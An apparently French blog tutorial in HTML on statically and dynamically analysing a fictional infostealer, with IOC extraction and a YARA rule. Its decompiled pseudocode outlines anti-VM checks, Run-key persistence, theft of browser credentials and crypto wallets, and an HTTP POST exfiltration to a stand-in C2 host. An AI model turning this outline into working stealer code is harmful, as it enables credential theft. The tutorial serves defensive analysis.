<!DOCTYPE html>
<html lang="fr" data-theme="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Reverse engineering d'un malware â€” CyberFolio</title>
  <meta name="description" content="Analyse statique et dynamique d'un malware avec Ghidra et x64dbg. Extraction des IOC et techniques d'obfuscation.">
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>ğŸ›¡ï¸</text></svg>">
  <link rel="stylesheet" href="css/style.css">
  <style>.reading-progress-bar{position:fixed;top:var(--nav-height);left:0;height:3px;z-index:1001;background:var(--accent);transition:width 0.1s linear;}</style>
</head>
<body>

  <div class="reading-progress-bar reading-progress" style="width:0%"></div>

  <nav class="nav"><div class="nav-inner"><a href="index.html" class="nav-logo"><span class="logo-icon">CF</span>CyberFolio</a><ul class="nav-links"><li><a href="index.html">Accueil</a></li><li><a href="blog.html" class="active">Blog</a></li><li><a href="projects.html">Projets</a></li><li><a href="about.html">Ã€ propos</a></li><li><a href="contact.html">Contact</a></li></ul><div style="display:flex;align-items:center;gap:0.75rem;"><button class="theme-toggle" aria-label="Toggle theme">ğŸŒ™</button><button class="nav-burger" aria-label="Menu"><span></span><span></span><span></span></button></div></div></nav>
  <div class="mobile-menu"><a href="index.html">Accueil</a><a href="blog.html">Blog</a><a href="projects.html">Projets</a><a href="about.html">Ã€ propos</a><a href="contact.html">Contact</a></div>

  <section class="article-hero container">
    <span class="card-tag tag-reverse">Reverse Engineering</span>
    <h1>Reverse engineering d'un malware : analyse statique et dynamique</h1>
    <div class="article-meta">
      <span>ğŸ“… 5 FÃ©vrier 2026</span>
      <span>â±ï¸ 15 min de lecture</span>
      <span>âœï¸ CyberFolio</span>
    </div>
  </section>

  <article class="article-content">

    <div class="toc">
      <h4>Sommaire</h4>
      <ul>
        <li><a href="#intro">Introduction</a></li>
        <li><a href="#setup">1. Environnement d'analyse</a></li>
        <li><a href="#static">2. Analyse statique</a></li>
        <li><a href="#dynamic">3. Analyse dynamique</a></li>
        <li><a href="#ioc">4. Extraction des IOC</a></li>
        <li><a href="#report">5. RÃ©daction du rapport</a></li>
      </ul>
    </div>

    <h2 id="intro">Introduction</h2>
    <p>Le reverse engineering de malware est une compÃ©tence essentielle pour les analystes SOC, les chercheurs en menaces, et les Ã©quipes de rÃ©ponse Ã  incident. Elle permet de comprendre le fonctionnement d'un logiciel malveillant, d'extraire ses indicateurs de compromission (IOC), et de dÃ©velopper des contre-mesures.</p>

    <p>Dans cet article, nous allons analyser un Ã©chantillon malveillant (fictif) de type infostealer en utilisant Ghidra pour l'analyse statique et x64dbg pour l'analyse dynamique.</p>

    <blockquote>
      âš ï¸ <strong>SÃ©curitÃ©</strong> : Toujours analyser les malwares dans une machine virtuelle isolÃ©e, sans accÃ¨s rÃ©seau vers l'extÃ©rieur. Utilisez FlareVM ou REMnux.
    </blockquote>

    <h2 id="setup">1. Environnement d'analyse</h2>
    <p>Avant de commencer, il faut un environnement sÃ©curisÃ© et outillÃ©. Voici la configuration recommandÃ©e :</p>

    <pre><code># Configuration de la VM d'analyse
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# OS           : Windows 10 (FlareVM) ou REMnux (Linux)
# RAM          : 8 Go minimum
# RÃ©seau       : Host-only ou dÃ©sactivÃ©
# Snapshots    : Prendre un snapshot AVANT toute analyse

# Outils essentiels :
# â”œâ”€â”€ Ghidra          â†’ DÃ©compilation / analyse statique
# â”œâ”€â”€ x64dbg          â†’ DÃ©bogage dynamique
# â”œâ”€â”€ PE-bear         â†’ Analyse de headers PE
# â”œâ”€â”€ Detect It Easy  â†’ DÃ©tection de packers
# â”œâ”€â”€ Process Monitor â†’ Surveillance des appels systÃ¨me
# â”œâ”€â”€ Wireshark       â†’ Capture rÃ©seau
# â””â”€â”€ YARA            â†’ DÃ©tection par signatures</code></pre>

    <h2 id="static">2. Analyse statique</h2>
    <p>L'analyse statique consiste Ã  examiner le binaire sans l'exÃ©cuter. On commence par le triage :</p>

    <pre><code># Calcul des hashes
sha256sum sample.exe
# â†’ a3f7b2d91e4c8f...

# VÃ©rification sur VirusTotal
# 52/72 dÃ©tections â€” confirmÃ© malveillant

# Analyse des strings
strings sample.exe | grep -iE "(http|\.dll|cmd|powershell|reg)"
# â†’ http://c2.evil-domain.xyz/gate.php
# â†’ cmd.exe /c whoami
# â†’ SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# â†’ advapi32.dll
# â†’ crypt32.dll

# Analyse avec Detect It Easy
# â†’ UPX packed (v3.96)</code></pre>

    <p>Le binaire est packÃ© avec UPX. On le dÃ©packe avant d'analyser :</p>

    <pre><code># DÃ©compression UPX
upx -d sample.exe -o sample_unpacked.exe

# VÃ©rification : la taille passe de 45 KB Ã  180 KB
# Les strings sont maintenant lisibles</code></pre>

    <h3>2.1 Analyse dans Ghidra</h3>
    <p>On ouvre le binaire dÃ©packÃ© dans Ghidra et on examine les fonctions principales :</p>

    <pre><code>// Fonction principale dÃ©compilÃ©e (simplifiÃ©e)
void main(void) {
    // 1. Anti-VM : vÃ©rifie si on est dans une sandbox
    if (check_vm_artifacts() == TRUE) {
        ExitProcess(0);
    }
    
    // 2. Persistence : clÃ© de registre Run
    add_registry_persistence("MicrosoftUpdate", path_to_self);
    
    // 3. Vol de donnÃ©es
    steal_browser_credentials();  // Chrome, Firefox
    steal_crypto_wallets();       // MetaMask, Phantom
    
    // 4. Exfiltration via HTTP POST
    char* data = collect_stolen_data();
    http_post("http://c2.evil-domain.xyz/gate.php", data);
    
    // 5. Auto-destruction
    self_delete();
}</code></pre>

    <h2 id="dynamic">3. Analyse dynamique</h2>
    <p>On lance le malware dans notre VM isolÃ©e avec x64dbg et Process Monitor pour observer son comportement rÃ©el :</p>

    <pre><code># Observations avec Process Monitor :
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# 1. Lecture de : C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data
# 2. Ã‰criture de : C:\Users\*\AppData\Local\Temp\data.zip
# 3. Connexion vers : 185.234.xx.xx:80 (c2.evil-domain.xyz)
# 4. CrÃ©ation clÃ© : HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate
# 5. Suppression de : sample.exe (auto-delete via cmd.exe)</code></pre>

    <h2 id="ioc">4. Extraction des IOC</h2>
    <p>On compile les indicateurs de compromission pour le partage avec la communautÃ© :</p>

    <pre><code># IOC extraits
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# SHA256 : a3f7b2d91e4c8f...
# C2     : c2.evil-domain.xyz (185.234.xx.xx)
# URI    : /gate.php
# RegKey : HKCU\...\Run\MicrosoftUpdate
# Files  : %TEMP%\data.zip
# UA     : Mozilla/5.0 (compatible; MSIE 10.0)

# RÃ¨gle YARA
rule Infostealer_Sample {
    meta:
        author = "CyberFolio"
        date = "2026-02-05"
    strings:
        $c2 = "c2.evil-domain.xyz"
        $uri = "/gate.php"
        $reg = "MicrosoftUpdate"
        $api1 = "CryptUnprotectData"
        $api2 = "InternetOpenUrlA"
    condition:
        uint16(0) == 0x5A4D and 3 of them
}</code></pre>

    <h2 id="report">5. RÃ©daction du rapport</h2>
    <p>Un bon rapport d'analyse malware suit une structure standardisÃ©e. Il doit contenir un rÃ©sumÃ© exÃ©cutif (pour les dÃ©cideurs), l'analyse technique dÃ©taillÃ©e (pour les analystes), les IOC en format machine-readable (STIX/TAXII, OpenIOC, ou CSV), et les recommandations de remÃ©diation.</p>

    <p>Partagez vos IOC sur des plateformes comme MISP, OTX (AlienVault), ou VirusTotal pour aider la communautÃ© Ã  se protÃ©ger.</p>

    <blockquote>
      ğŸ¯ <strong>Ã€ retenir</strong> : Le reverse engineering est un puzzle. Chaque analyse vous rend meilleur. Commencez par des challenges simples (crackmes) avant de passer aux vrais malwares.
    </blockquote>

    <div style="margin-top:4rem;padding-top:2rem;border-top:1px solid var(--border);text-align:center;">
      <a href="blog.html" class="btn btn-secondary">â† Retour au blog</a>
    </div>
  </article>

  <footer class="footer"><div class="container footer-inner"><span class="footer-text">Â© 2026 CyberFolio. Construit avec passion et cafÃ© â˜•</span><div class="footer-links"><a href="https://github.com/username" target="_blank" rel="noopener">GitHub</a><a href="https://twitter.com/username" target="_blank" rel="noopener">Twitter</a><a href="https://linkedin.com/in/username" target="_blank" rel="noopener">LinkedIn</a></div></div></footer>
  <script src="js/main.js"></script>
</body>
</html>
